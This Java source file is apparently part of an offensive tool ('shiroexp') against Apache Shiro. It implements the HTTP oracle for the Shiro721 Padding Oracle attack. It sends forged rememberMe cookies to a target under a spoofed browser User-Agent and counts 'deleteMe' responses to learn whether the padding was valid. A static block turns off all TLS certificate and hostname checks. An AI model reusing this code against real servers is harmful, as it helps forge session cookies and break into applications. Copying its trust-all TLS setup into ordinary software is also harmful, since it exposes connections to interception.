package com.y5neko.shiroexp.request.shiro721;

import javax.net.ssl.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * HTTP 请求工具类（简化版）
 * 专门用于 Shiro721 Padding Oracle 攻击
 */
public class HttpRequest {

    static {
        try {
            // 设置 HTTPS 信任所有证书
            SSLContext sslcontext = SSLContext.getInstance("SSL");
            sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
                @Override
                public void checkClientTrusted(X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(X509Certificate[] chain, String authType) {
                }

                @Override
                public X509Certificate[] getAcceptedIssuers() {
                    return new X509Certificate[0];
                }
            }}, null);
            HostnameVerifier ignoreHostnameVerifier = new HostnameVerifier() {
                @Override
                public boolean verify(String s, SSLSession sslsession) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
        } catch (NoSuchAlgorithmException | KeyManagementException e) {
            e.printStackTrace();
        }
    }

    /**
     * 统计 deleteMe Cookie 的数量
     * 这是 Padding Oracle 攻击的核心方法，用于判断服务器是否接受修改后的 Cookie
     *
     * @param httpRequestInfo HTTP 请求信息
     * @param cookieValue Cookie 值（Base64 编码）
     * @return deleteMe Cookie 的数量
     */
    public static int getDeleteMeCount(HttpRequestInfo httpRequestInfo, String cookieValue) {
        // 从 HttpRequestInfo 获取 Cookie 名称
        String rememberMeCookieName = httpRequestInfo.getRememberMeCookieName();

        int count = 0;
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();
            connection.setRequestMethod(httpRequestInfo.getRequestMethod());

            // 设置请求头
            if (httpRequestInfo.getHeaders().size() == 0) {
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
                connection.setRequestProperty("Cookie", rememberMeCookieName + "=" + cookieValue);
                connection.setRequestProperty("Connection", "close");
            } else {
                Map<String, String> cloneHeaders = new HashMap<>();
                cloneHeaders.putAll(httpRequestInfo.getHeaders());

                String cookie = cloneHeaders.get("Cookie");
                if (cookie == null) {
                    cloneHeaders.put("Cookie", rememberMeCookieName + "=" + cookieValue);
                } else if (!cookie.contains(rememberMeCookieName + "=")) {
                    cookie = cookie + "; " + rememberMeCookieName + "=" + cookieValue;
                    cloneHeaders.put("Cookie", cookie);
                } else {
                    int start = cookie.indexOf(rememberMeCookieName) + rememberMeCookieName.length() + 1;
                    int end = cookie.indexOf(";", start);
                    end = end == -1 ? cookie.length() : end;
                    cookie = cookie.substring(0, start) + cookieValue + cookie.substring(end);
                    cloneHeaders.put("Cookie", cookie);
                }

                // 添加头部
                for (Map.Entry<String, String> entry : cloneHeaders.entrySet()) {
                    connection.setRequestProperty(entry.getKey(), entry.getValue());
                }
            }

            // 设置 POST 请求体
            String requestBody = httpRequestInfo.getRequestBody();
            if (requestBody != null && !requestBody.trim().equals("")) {
                connection.setDoOutput(true);
                connection.setDoInput(true);

                PrintWriter printWriter = new PrintWriter(connection.getOutputStream());
                printWriter.write(requestBody);
                printWriter.flush();
            }

            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();

            // 统计 deleteMe Cookie
            Map<String, List<String>> map = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : map.entrySet()) {
                if (entry.getKey() == null) {
                    continue;
                }

                if (entry.getKey().equalsIgnoreCase("set-cookie")) {
                    for (String str : entry.getValue()) {
                        if (str.contains(rememberMeCookieName + "=deleteMe")) {
                            count++;
                        }
                    }
                    break;
                }
            }
        } catch (Exception e) {
            // 静默处理异常
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }

        return count;
    }

    /**
     * 测试 Cookie 有效性
     * 如果响应包的 set-cookie 中不存在 "keyword=deleteMe"，则表示 Cookie 有效
     *
     * @param httpRequestInfo HTTP 请求信息
     * @param cookieValue Cookie 值（Base64 编码）
     * @return Cookie 是否有效（true=有效，false=无效）
     */
    public static boolean testCookieValidity(HttpRequestInfo httpRequestInfo, String cookieValue) {
        // 从 HttpRequestInfo 获取 Cookie 名称
        String rememberMeCookieName = httpRequestInfo.getRememberMeCookieName();

        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();
            connection.setRequestMethod(httpRequestInfo.getRequestMethod());

            // 设置请求头
            if (httpRequestInfo.getHeaders().size() == 0) {
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
                connection.setRequestProperty("Cookie", rememberMeCookieName + "=" + cookieValue);
                connection.setRequestProperty("Connection", "close");
            } else {
                Map<String, String> cloneHeaders = new HashMap<>();
                cloneHeaders.putAll(httpRequestInfo.getHeaders());

                String cookie = cloneHeaders.get("Cookie");
                if (cookie == null) {
                    cloneHeaders.put("Cookie", rememberMeCookieName + "=" + cookieValue);
                } else if (!cookie.contains(rememberMeCookieName + "=")) {
                    cookie = cookie + "; " + rememberMeCookieName + "=" + cookieValue;
                    cloneHeaders.put("Cookie", cookie);
                } else {
                    int start = cookie.indexOf(rememberMeCookieName) + rememberMeCookieName.length() + 1;
                    int end = cookie.indexOf(";", start);
                    end = end == -1 ? cookie.length() : end;
                    cookie = cookie.substring(0, start) + cookieValue + cookie.substring(end);
                    cloneHeaders.put("Cookie", cookie);
                }

                // 添加头部
                for (Map.Entry<String, String> entry : cloneHeaders.entrySet()) {
                    connection.setRequestProperty(entry.getKey(), entry.getValue());
                }
            }

            // 设置 POST 请求体
            String requestBody = httpRequestInfo.getRequestBody();
            if (requestBody != null && !requestBody.trim().equals("")) {
                connection.setDoOutput(true);
                connection.setDoInput(true);

                PrintWriter printWriter = new PrintWriter(connection.getOutputStream());
                printWriter.write(requestBody);
                printWriter.flush();
            }

            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();

            // 检查响应中的 set-cookie 头
            Map<String, List<String>> map = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : map.entrySet()) {
                if (entry.getKey() == null) {
                    continue;
                }

                if (entry.getKey().equalsIgnoreCase("set-cookie")) {
                    for (String str : entry.getValue()) {
                        // 如果存在 "keyword=deleteMe"，说明 Cookie 无效
                        if (str.contains(rememberMeCookieName + "=deleteMe")) {
                            return false;
                        }
                    }
                }
            }

            // 没有找到 deleteMe，Cookie 有效
            return true;

        } catch (Exception e) {
            // 发生异常时认为 Cookie 无效
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}
